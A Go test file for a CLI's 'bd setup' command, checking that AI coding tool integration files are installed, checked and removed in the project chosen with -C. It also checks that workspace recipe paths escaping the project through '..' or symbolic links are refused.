			{name: "path through a link inside", recipe: "lint", toml: "[recipes.lint]\npath = \"in/lint.md\"\n", file: "sub/lint.md",
				links: map[string]string{"in": "sub"}},
			{name: "windsurf override", recipe: "windsurf", toml: "[recipes.windsurf]\npath = \"rules/beads.md\"\n", file: "rules/beads.md"},
			{name: "built-in windsurf", recipe: "windsurf", file: ".windsurf/rules/beads.md"},
		} {
			t.Run(tt.name, func(t *testing.T) {
				ws, _ := workspace(t, tt.toml, tt.links)
				file := filepath.Join(ws, filepath.FromSlash(tt.file))
				for _, mode := range []struct {
					name   string
					flag   *bool
					exists bool
				}{{"install", nil, true}, {"--check", &setupCheck, true}, {"--remove", &setupRemove, false}} {
					resetSetupGlobals(t)
					if mode.flag != nil {
						*mode.flag = true
					}
					var err error
					_, stderr := captureStdio(t, func() { err = runRecipe(tt.recipe) })
					if err != nil || stderr != "" {
						t.Errorf("bd setup %s %s: %v, stderr %q", tt.recipe, mode.name, err, stderr)
					}
					if _, err := os.Stat(file); (err == nil) != mode.exists {
						t.Errorf("after bd setup %s %s, %s exists = %v, want %v", tt.recipe, mode.name, tt.file, err == nil, mode.exists)
					}
				}
			})
		}
	})
}

// TestAddRecipe_RefusesPathOutsideDir pins that bd setup --add does not save
// a recipe whose path bd setup would refuse (recipes.PathInside), and saves
// an ordinary one, and one with no path, as before.
func TestAddRecipe_RefusesPathOutsideDir(t *testing.T) {
	ws := t.TempDir()
	beadsDir := filepath.Join(ws, ".beads")
	if err := os.MkdirAll(beadsDir, 0o750); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(beadsDir, "config.yaml"), nil, 0o600); err != nil {
		t.Fatal(err)
	}
	t.Chdir(ws)
	t.Setenv("BEADS_DIR", "")
	resetSetupResolutionCaches(t)

	for _, path := range []string{filepath.Join("..", "victim.md"), filepath.Join(ws, "victim.md")} {
		err := addRecipe("myeditor", path)
		if want := "recipe path " + recipeRefusalWord(path) + " is not inside the directory bd setup runs in; " +
			"a .beads/recipes.toml recipe can only name a relative path with no '..' or symbolic link leading out of the directory bd setup runs in, and no dangling or looping link along it"; err == nil || err.Error() != want {
			t.Errorf("bd setup --add myeditor %q = %v; want %q", path, err, want)
		}
		if _, err := os.Stat(filepath.Join(beadsDir, "recipes.toml")); !os.IsNotExist(err) {
			t.Fatalf("bd setup --add myeditor %q wrote recipes.toml: %v", path, err)
		}
	}
	for _, path := range []string{".myeditor/rules.md", ""} {
		if out := captureStdout(t, func() error { return addRecipe("myeditor", path) }); !strings.HasPrefix(out, "✓ Added recipe 'myeditor'") {
			t.Errorf("bd setup --add myeditor %q printed %q", path, out)
		}
		saved, err := recipes.LoadUserRecipes(beadsDir)
		if err != nil || saved["myeditor"].Path != path {
			t.Errorf("bd setup --add myeditor %q saved %+v, %v", path, saved["myeditor"], err)
		}
	}
}

// setupChangeDirWorkspace builds the #8283 fixture: a launch directory L
// the test runs in, and an initialized target workspace T that -C selects.
// It returns T's path with symlinks resolved, so comparisons match what
// -C resolution yields, and beads dir T/.beads is exported as BEADS_DIR the
// way applyChangeDirSelection does.
func setupChangeDirWorkspace(t *testing.T) (launch, target string) {
	t.Helper()
	launch = t.TempDir()
	target = t.TempDir()
	if resolved, err := filepath.EvalSymlinks(target); err == nil {
		target = resolved
	}
	beadsDir := filepath.Join(target, ".beads")
	if err := os.MkdirAll(beadsDir, 0o755); err != nil {
		t.Fatalf("MkdirAll: %v", err)
	}
	if err := os.WriteFile(filepath.Join(beadsDir, "metadata.json"), []byte(`{"backend":"dolt"}`), 0o644); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	t.Setenv("HOME", t.TempDir())
	t.Setenv("BEADS_DIR", beadsDir)
	t.Setenv("CODEX_HOME", "")
	t.Chdir(launch)
	resetSetupResolutionCaches(t)
	resetSetupGlobals(t)
	return launch, target
}

// setupChangeDir selects target the way the -C flag does, for the run under
// test, and stops selecting it when the test ends.
func setupChangeDir(t *testing.T, target string) {
	t.Helper()
	origChangeDir := changeDir
	changeDir = target
	t.Cleanup(func() { changeDir = origChangeDir })
}

// assertOnlyEntry reports whether dir holds no entry besides itself.
func assertDirEmpty(t *testing.T, dir, what string) {
	t.Helper()
	entries, err := os.ReadDir(dir)
	if err != nil {
		t.Fatalf("%s: ReadDir: %v", what, err)
	}
	if len(entries) != 0 {
		t.Errorf("%s: %s holds %d entries (%v); want it untouched", what, dir, len(entries), entries)
	}
}

// TestSetupClaude_ChangeDirWritesToSelectedProject pins #8283: `bd -C <project>
// setup claude` must write the project's Claude integration under <project>,
// not under the process working directory, as `cd <project> && bd setup
// claude` does.
func TestSetupClaude_ChangeDirWritesToSelectedProject(t *testing.T) {
	startDir, projectDir := setupChangeDirWorkspace(t)
	restoreManaged := setup.SetClaudeManagedSettingsDirForTest("")
	t.Cleanup(restoreManaged)
	setupChangeDir(t, projectDir)

	_ = captureStdout(t, func() error {
		return runRecipe("claude")
	})

	if _, err := os.Stat(filepath.Join(startDir, ".claude")); !os.IsNotExist(err) {
		t.Errorf("bd -C %s setup claude wrote .claude into the process cwd %s (stat err=%v)", projectDir, startDir, err)
	}
	if _, err := os.Stat(filepath.Join(projectDir, ".claude", "settings.json")); err != nil {
		t.Errorf("bd -C %s setup claude did not write the selected project's .claude/settings.json: %v", projectDir, err)
	}
}

// TestSetupChangeDir_InstallWritesTarget pins #8283's install half for every
// project-scope recipe: run from launch directory L with -C T, each recipe's
// managed project files land under T, and L's tree stays untouched. The
// environment providers are the real defaults, not mocks pre-loaded with T,
// so the rows cover the provider wiring itself.
func TestSetupChangeDir_InstallWritesTarget(t *testing.T) {
	restoreManaged := setup.SetClaudeManagedSettingsDirForTest("")
	t.Cleanup(restoreManaged)

	for _, tt := range []struct {
		name  string
		flags func(t *testing.T)
		files []string // files the recipe must create under T (slash-relative)
	}{
		{name: "claude", files: []string{".claude/settings.json", "CLAUDE.md"}},
		{name: "codex", files: []string{"AGENTS.md", ".codex/config.toml", ".codex/hooks.json", ".agents/skills/beads/SKILL.md"}},
		{name: "cursor", files: []string{".cursor/rules/beads.mdc", ".cursor/hooks.json", ".agents/skills/beads/SKILL.md"}},
		{name: "factory", files: []string{"AGENTS.md"}},
		{name: "opencode", files: []string{"AGENTS.md"}},
		{name: "aider", files: []string{".aider.conf.yml", ".aider/BEADS.md", ".aider/README.md"}},
		{name: "junie", files: []string{".junie/guidelines.md", ".junie/mcp/mcp.json"}},
		{name: "windsurf", files: []string{".windsurf/rules/beads.md"}},
		{name: "cody", files: []string{".cody/rules/beads.md"}},
		{name: "kilocode", files: []string{".kilocode/rules/beads.md"}},
		{name: "kiro", files: []string{".kiro/steering/beads.md"}},
		{name: "copilot", files: []string{".copilot-plugin/plugin.json", ".github/copilot-instructions.md"}},
		{name: "gemini --project", flags: func(t *testing.T) { setupProject = true }, files: []string{"GEMINI.md", ".gemini/settings.json"}},
		{name: "mux --project", flags: func(t *testing.T) { setupProject = true }, files: []string{".mux/AGENTS.md", ".mux/init"}},
	} {
		t.Run(tt.name, func(t *testing.T) {
			launch, target := setupChangeDirWorkspace(t)
			setupChangeDir(t, target)
			if tt.flags != nil {
				tt.flags(t)
			}

			if err := runRecipe(strings.Split(tt.name, " ")[0]); err != nil {
				t.Fatalf("bd -C %s setup %s: %v", target, tt.name, err)
			}
			for _, rel := range tt.files {
				if _, err := os.Stat(filepath.Join(target, filepath.FromSlash(rel))); err != nil {
					t.Errorf("bd -C %s setup %s did not write %s: %v", target, tt.name, rel, err)
				}
			}
			assertDirEmpty(t, launch, "launch directory")
			if wd, err := os.Getwd(); err != nil || wd != launch {
				t.Errorf("setup moved the process working directory to %q (err=%v); want %q", wd, err, launch)
			}
		})
	}

	t.Run("workspace recipe", func(t *testing.T) {
		launch, target := setupChangeDirWorkspace(t)
		beadsDir := filepath.Join(target, ".beads")
		if err := os.WriteFile(filepath.Join(beadsDir, "recipes.toml"), []byte("[recipes.lint]\nname = \"Lint\"\npath = \"docs/lint.md\"\n"), 0o600); err != nil {
			t.Fatalf("WriteFile recipes.toml: %v", err)
		}
		setupChangeDir(t, target)

		out := captureStdout(t, func() error { return runRecipe("lint") })
		if _, err := os.Stat(filepath.Join(target, "docs", "lint.md")); err != nil {
			t.Errorf("bd -C %s setup lint did not write the workspace recipe's file: %v", target, err)
		}
		if !strings.Contains(out, filepath.Join(target, "docs", "lint.md")) {
			t.Errorf("bd -C %s setup lint did not report the absolute target path; output:\n%s", target, out)
		}
		assertDirEmpty(t, launch, "launch directory")
	})
}

// TestSetupChangeDir_RemoveTouchesOnlyTarget pins #8283's removal half: with
// an integration's files present in both the launch directory and the -C
// target, `bd -C <target> setup <recipe> --remove` takes them only from the
// target. The launch directory's copies keep their bytes, unrelated target
// content survives, and the target directory itself is never dropped.
func TestSetupChangeDir_RemoveTouchesOnlyTarget(t *testing.T) {
	for _, tt := range []struct {
		name  string
		files []string // the recipe's managed files (slash-relative), seeded in both T and L
		keep  []string // target content (slash-relative) that must survive
		seed  string   // rel path whose seed must be this bd-owned content, not filler
		owns  string   // that seed content, valid for the tool's remover
	}{
		{name: "windsurf", files: []string{".windsurf/rules/beads.md"}, keep: []string{"README.md"}},
		{name: "copilot", files: []string{".copilot-plugin/plugin.json", ".github/copilot-instructions.md"}},
		{name: "cursor", files: []string{".cursor/rules/beads.mdc", ".cursor/hooks.json", ".agents/skills/beads/SKILL.md"},
			seed: ".cursor/hooks.json", owns: `{"version": 1, "hooks": {}}`},
		{name: "aider", files: []string{".aider.conf.yml", ".aider/BEADS.md", ".aider/README.md"}, keep: []string{".aider/notes.md"}},
		{name: "junie", files: []string{".junie/guidelines.md", ".junie/mcp/mcp.json"}},
	} {
		t.Run(tt.name, func(t *testing.T) {
			launch, target := setupChangeDirWorkspace(t)
			setupChangeDir(t, target)
			setupRemove = true

			for _, dir := range []string{launch, target} {
				for _, rel := range tt.files {
					path := filepath.Join(dir, filepath.FromSlash(rel))
					if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
						t.Fatalf("MkdirAll: %v", err)
					}
					// Distinct bytes per side, so a missing-file assertion on
					// the wrong side cannot pass by reading the other's copy.
					content := "stale target copy\n"
					if dir == launch {
						content = "launch copy\n"
					}
					if rel == tt.seed {
						// The remover only takes a file it recognizes as bd's
						// own; filler it cannot parse stops it before the
						// removal under test.
						content = tt.owns
					}
					if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
						t.Fatalf("WriteFile: %v", err)
					}
				}
			}
			for _, rel := range tt.keep {
				path := filepath.Join(target, filepath.FromSlash(rel))
				if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
					t.Fatalf("MkdirAll: %v", err)
				}
				if err := os.WriteFile(path, []byte("unrelated\n"), 0o644); err != nil {
					t.Fatalf("WriteFile: %v", err)
				}
			}

			_ = captureStdout(t, func() error {
				return runRecipe(strings.Split(tt.name, " ")[0])
			})

			for _, rel := range tt.files {
				if _, err := os.Stat(filepath.Join(target, filepath.FromSlash(rel))); !os.IsNotExist(err) {
					t.Errorf("bd -C %s setup %s --remove left %s in the target (stat err=%v)", target, tt.name, rel, err)
				}
				launchCopy, err := os.ReadFile(filepath.Join(launch, filepath.FromSlash(rel)))
				want := "launch copy\n"
				if rel == tt.seed {
					want = tt.owns
				}
				if err != nil {
					t.Errorf("bd -C %s setup %s --remove took %s out of the launch directory %s: %v", target, tt.name, rel, launch, err)
				} else if string(launchCopy) != want {
					t.Errorf("bd -C %s setup %s --remove rewrote the launch copy of %s; now %q", target, tt.name, rel, launchCopy)
				}
			}
			for _, rel := range tt.keep {
				if _, err := os.Stat(filepath.Join(target, filepath.FromSlash(rel))); err != nil {
					t.Errorf("bd -C %s setup %s --remove took unrelated %s from the target: %v", target, tt.name, rel, err)
				}
			}
			if _, err := os.Stat(target); err != nil {
				t.Errorf("bd -C %s setup %s --remove dropped the target directory itself: %v", target, tt.name, err)
			}
		})
	}

	// A workspace recipe naming a bare file pins the generic branch's
	// directory cleanup under -C: the file comes out of the target, and the
	// empty-directory sweep that follows a removal never reaches the target
	// directory itself, which a bare filename's parent "." would name.
	t.Run("workspace bare file", func(t *testing.T) {
		launch, target := setupChangeDirWorkspace(t)
		if err := os.WriteFile(filepath.Join(target, ".beads", "recipes.toml"), []byte("[recipes.plan]\nname = \"Plan\"\npath = \"plan.md\"\n"), 0o600); err != nil {
			t.Fatalf("WriteFile recipes.toml: %v", err)
		}
		setupChangeDir(t, target)
		setupRemove = true
		if err := os.WriteFile(filepath.Join(target, "plan.md"), []byte("stale target copy\n"), 0o644); err != nil {
			t.Fatalf("WriteFile target plan.md: %v", err)
		}
		if err := os.WriteFile(filepath.Join(launch, "plan.md"), []byte("launch copy\n"), 0o644); err != nil {
			t.Fatalf("WriteFile launch plan.md: %v", err)
		}

		_ = captureStdout(t, func() error { return runRecipe("plan") })

		if _, err := os.Stat(filepath.Join(target, "plan.md")); !os.IsNotExist(err) {
			t.Errorf("bd -C %s setup plan --remove left plan.md in the target (stat err=%v)", target, err)
		}
		launchCopy, err := os.ReadFile(filepath.Join(launch, "plan.md"))
		if err != nil || string(launchCopy) != "launch copy\n" {
			t.Errorf("bd -C %s setup plan --remove took or rewrote the launch copy (err=%v, now %q)", target, err, launchCopy)
		}
		if _, err := os.Stat(target); err != nil {
			t.Errorf("bd -C %s setup plan --remove dropped the target directory itself: %v", target, err)
		}
	})
}

// TestSetupChangeDir_CheckReadsTarget pins #8283's check half: `bd -C <target>
// setup <recipe> --check` judges the target, not the process working
// directory. Installed under the target it reports installed; installed only
// in the launch directory it reports not installed.
func TestSetupChangeDir_CheckReadsTarget(t *testing.T) {
	restoreManaged := setup.SetClaudeManagedSettingsDirForTest("")
	t.Cleanup(restoreManaged)

	for _, name := range []string{"windsurf", "cursor", "aider", "junie"} {
		t.Run(name, func(t *testing.T) {
			// The integration is installed into the launch directory with no
			// -C binding, the way a pre-#8283 `bd setup <recipe>` from there
			// left it, and the target stays empty: --check must then report
			// not installed, which runRecipe signals by returning an error.
			launch, target := setupChangeDirWorkspace(t)
			if err := runRecipe(name); err != nil {
				t.Fatalf("bd setup %s (no -C, seeding the launch directory): %v", name, err)
			}
			setupChangeDir(t, target)
			setupCheck = true
			_, missingErr := captureStdoutWithError(t, func() error { return runRecipe(name) })
			if missingErr == nil {
				t.Errorf("bd -C %s setup %s --check reported installed; the integration is in the launch directory %s, not the target", target, name, launch)
			}
			setupCheck = false

			// Installed under the target (with the binding), --check reports
			// installed, and the generic branch names the target's files.
			launch, target = setupChangeDirWorkspace(t)
			setupChangeDir(t, target)
			if err := runRecipe(name); err != nil {
				t.Fatalf("bd -C %s setup %s (seeding the target): %v", target, name, err)
			}
			setupCheck = true
			out, checkErr := captureStdoutWithError(t, func() error { return runRecipe(name) })
			if checkErr != nil {
				t.Fatalf("bd -C %s setup %s --check reported not installed: %v\noutput:\n%s", target, name, checkErr, out)
			}
			if name == "windsurf" && !strings.Contains(out, filepath.Join(target, ".windsurf", "rules", "beads.md")) {
				t.Errorf("bd -C %s setup windsurf --check did not name the target's file; output:\n%s", target, out)
			}
			assertDirEmpty(t, launch, "launch directory")
		})
	}
}

// TestSetupChangeDir_WorkspaceRecipeConfinedToTarget pins #8283's
// confinement half: under -C <target> a .beads/recipes.toml recipe's files
// land in the target, so its paths are held inside the target — a symbolic
// link in the target leading out is followed by neither install, --check,
// --remove nor --add, and the refusal names the selected project. A recipe
// whose path stays inside the target still installs.
func TestSetupChangeDir_WorkspaceRecipeConfinedToTarget(t *testing.T) {
	// seedEscape gives the target a .beads/recipes.toml recipe whose path
	// runs through "out", a symbolic link in the target leading to outside,
	// where lint.md already sits.
	seedEscape := func(t *testing.T) (target, outside string) {
		t.Helper()
		_, target = setupChangeDirWorkspace(t)
		outside = t.TempDir()
		if err := os.Symlink(outside, filepath.Join(target, "out")); err != nil {
			t.Fatalf("Symlink: %v", err)
		}
		if err := os.WriteFile(filepath.Join(outside, "lint.md"), []byte("outside\n"), 0o644); err != nil {
			t.Fatalf("WriteFile: %v", err)
		}
		if err := os.WriteFile(filepath.Join(target, ".beads", "recipes.toml"), []byte("[recipes.lint]\nname = \"Lint\"\npath = \"out/lint.md\"\n"), 0o600); err != nil {
			t.Fatalf("WriteFile recipes.toml: %v", err)
		}
		setupChangeDir(t, target)
		return target, outside
	}

	t.Run("install refuses", func(t *testing.T) {
		target, outside := seedEscape(t)
		var runErr error
		stderr := captureStderr(t, func() { runErr = runRecipe("lint") })
		if runErr == nil {
			t.Errorf("bd -C %s setup lint installed a recipe whose path leaves the target through a link", target)
		}
		if !strings.Contains(stderr, "selected project directory") {
			t.Errorf("bd -C %s setup lint refusal does not name the selected project; stderr:\n%s", target, stderr)
		}
		if got, err := os.ReadFile(filepath.Join(outside, "lint.md")); err != nil || string(got) != "outside\n" {
			t.Errorf("bd -C %s setup lint wrote through the target's link (err=%v, now %q)", target, err, got)
		}
	})

	t.Run("check refuses", func(t *testing.T) {
		target, _ := seedEscape(t)
		setupCheck = true
		var runErr error
		_ = captureStderr(t, func() { runErr = runRecipe("lint") })
		if runErr == nil {
			t.Errorf("bd -C %s setup lint --check judged a recipe whose path leaves the target through a link", target)
		}
	})

	t.Run("remove refuses", func(t *testing.T) {
		target, outside := seedEscape(t)
		setupRemove = true
		var runErr error
		_ = captureStderr(t, func() { runErr = runRecipe("lint") })
		if runErr == nil {
			t.Errorf("bd -C %s setup lint --remove removed through a recipe whose path leaves the target", target)
		}
		if _, err := os.Stat(filepath.Join(outside, "lint.md")); err != nil {
			t.Errorf("bd -C %s setup lint --remove took the file outside the target: %v", target, err)
		}
	})

	t.Run("add refuses", func(t *testing.T) {
		target, _ := seedEscape(t)
		if err := addRecipe("sneaky", "out/notes.md"); err == nil {
			t.Errorf("bd -C %s setup --add saved a recipe whose path leaves the target through a link", target)
		}
	})

	t.Run("path inside target installs", func(t *testing.T) {
		_, target := setupChangeDirWorkspace(t)
		if err := os.WriteFile(filepath.Join(target, ".beads", "recipes.toml"), []byte("[recipes.lint]\nname = \"Lint\"\npath = \"docs/lint.md\"\n"), 0o600); err != nil {
			t.Fatalf("WriteFile recipes.toml: %v", err)
		}
		setupChangeDir(t, target)
		if err := runRecipe("lint"); err != nil {
			t.Fatalf("bd -C %s setup lint (path inside the target): %v", target, err)
		}
		if _, err := os.Stat(filepath.Join(target, "docs", "lint.md")); err != nil {
			t.Errorf("bd -C %s setup lint did not write the target's file: %v", target, err)
		}
	})
}

// TestSetupChangeDir_GlobalScopeUnchanged pins that -C selects only the
// project layer: a global install's files keep their user-level
// destinations under the home directory, whatever -C selected (GH#8283's
// design leaves global scope untouched).
func TestSetupChangeDir_GlobalScopeUnchanged(t *testing.T) {
	restoreManaged := setup.SetClaudeManagedSettingsDirForTest("")
	t.Cleanup(restoreManaged)

	for _, tt := range []struct {
		name  string
		flags func(t *testing.T)
		files []string // user-level files (slash-relative to HOME) the install must write
	}{
		{name: "cursor --global", flags: func(t *testing.T) { setupGlobal = true }, files: []string{".cursor/hooks.json"}},
		{name: "gemini", files: []string{".gemini/settings.json", ".gemini/GEMINI.md"}},
		{name: "claude --global", flags: func(t *testing.T) { setupGlobal = true }, files: []string{".claude/settings.json"}},
	} {
		t.Run(tt.name, func(t *testing.T) {
			launch, target := setupChangeDirWorkspace(t)
			setupChangeDir(t, target)
			home, err := os.UserHomeDir()
			if err != nil {
				t.Fatalf("UserHomeDir: %v", err)
			}
			if tt.flags != nil {
				tt.flags(t)
			}
			if err := runRecipe(strings.Split(tt.name, " ")[0]); err != nil {
				t.Fatalf("bd -C %s setup %s: %v", target, tt.name, err)
			}
			for _, rel := range tt.files {
				if _, err := os.Stat(filepath.Join(home, filepath.FromSlash(rel))); err != nil {
					t.Errorf("bd -C %s setup %s did not write the user-level %s: %v", target, tt.name, rel, err)
				}
				for _, dir := range []string{launch, target} {
					if _, err := os.Stat(filepath.Join(dir, filepath.FromSlash(rel))); !os.IsNotExist(err) {
						t.Errorf("bd -C %s setup %s wrote %s into %s (stat err=%v)", target, tt.name, rel, dir, err)
					}
				}
			}
		})
	}
}

// TestSetupChangeDir_NoFlagStaysCwd pins the other side of GH#8283's design:
// without -C, a setup run installs into the process working directory and
// keeps its old relative spelling in the output.
func TestSetupChangeDir_NoFlagStaysCwd(t *testing.T) {
	launch, _ := setupChangeDirWorkspace(t)
	orig := changeDir
	changeDir = ""
	t.Cleanup(func() { changeDir = orig })

	out := captureStdout(t, func() error { return runRecipe("windsurf") })
	if _, err := os.Stat(filepath.Join(launch, ".windsurf", "rules", "beads.md")); err != nil {
		t.Errorf("bd setup windsurf (no -C) did not write the working directory's file: %v", err)
	}
	if !strings.Contains(out, "File: .windsurf/rules/beads.md") {
		t.Errorf("bd setup windsurf (no -C) lost the relative path in its output; output:\n%s", out)
	}
	if strings.Contains(out, launch) {
		t.Errorf("bd setup windsurf (no -C) printed an absolute path; output:\n%s", out)
	}
}

// TestSetupChangeDir_RestoresBinding pins that the -C binding lasts one run:
// after a run, refused or not, a setup run without -C installs into the
// working directory with its old relative output. A relative -C also names
// its directory against the working directory, as git -C does.
func TestSetupChangeDir_RestoresBinding(t *testing.T) {
	t.Run("after success", func(t *testing.T) {
		launch, target := setupChangeDirWorkspace(t)
		setupChangeDir(t, target)
		if err := runRecipe("windsurf"); err != nil {
			t.Fatalf("bd -C %s setup windsurf: %v", target, err)
		}
		if _, err := os.Stat(filepath.Join(target, ".windsurf", "rules", "beads.md")); err != nil {
			t.Fatalf("bd -C %s setup windsurf did not write the target's file: %v", target, err)
		}
		changeDir = ""
		out := captureStdout(t, func() error { return runRecipe("cody") })
		if _, err := os.Stat(filepath.Join(launch, ".cody", "rules", "beads.md")); err != nil {
			t.Errorf("the -C binding outlived its run: bd setup cody afterwards did not write the working directory: %v", err)
		}
		if strings.Contains(out, launch) {
			t.Errorf("bd setup cody after a -C run printed an absolute path; output:\n%s", out)
		}
	})

	t.Run("after refusal", func(t *testing.T) {
		launch, target := setupChangeDirWorkspace(t)
		outside := t.TempDir()
		if err := os.Symlink(outside, filepath.Join(target, "out")); err != nil {
			t.Fatalf("Symlink: %v", err)
		}
		if err := os.WriteFile(filepath.Join(target, ".beads", "recipes.toml"), []byte("[recipes.lint]\nname = \"Lint\"\npath = \"out/lint.md\"\n"), 0o600); err != nil {
			t.Fatalf("WriteFile recipes.toml: %v", err)
		}
		setupChangeDir(t, target)
		if _, err := captureStdoutWithError(t, func() error { return runRecipe("lint") }); err == nil {
			t.Fatalf("bd -C %s setup lint (escaping path) was not refused", target)
		}
		changeDir = ""
		out := captureStdout(t, func() error { return runRecipe("cody") })
		if _, err := os.Stat(filepath.Join(launch, ".cody", "rules", "beads.md")); err != nil {
			t.Errorf("a refused -C run left its binding: bd setup cody afterwards did not write the working directory: %v", err)
		}
		if strings.Contains(out, launch) {
			t.Errorf("bd setup cody after a refused -C run printed an absolute path; output:\n%s", out)
		}
	})

	t.Run("relative -C names against the working directory", func(t *testing.T) {
		launch := t.TempDir()
		target := filepath.Join(launch, "rel")
		beadsDir := filepath.Join(target, ".beads")
		if err := os.MkdirAll(beadsDir, 0o755); err != nil {
			t.Fatalf("MkdirAll: %v", err)
		}
		if err := os.WriteFile(filepath.Join(beadsDir, "metadata.json"), []byte(`{"backend":"dolt"}`), 0o644); err != nil {
			t.Fatalf("WriteFile: %v", err)
		}
		t.Setenv("HOME", t.TempDir())
		t.Setenv("BEADS_DIR", beadsDir)
		t.Setenv("CODEX_HOME", "")
		t.Chdir(launch)
		resetSetupResolutionCaches(t)
		resetSetupGlobals(t)
		orig := changeDir
		changeDir = "rel"
		t.Cleanup(func() { changeDir = orig })

		if err := runRecipe("windsurf"); err != nil {
			t.Fatalf("bd -C rel setup windsurf: %v", err)
		}
		if _, err := os.Stat(filepath.Join(target, ".windsurf", "rules", "beads.md")); err != nil {
			t.Errorf("bd -C rel setup windsurf did not write rel/'s file: %v", err)
		}
		if _, err := os.Stat(filepath.Join(launch, ".windsurf")); !os.IsNotExist(err) {
			t.Errorf("bd -C rel setup windsurf wrote into the launch directory %s (stat err=%v)", launch, err)
		}
	})
}
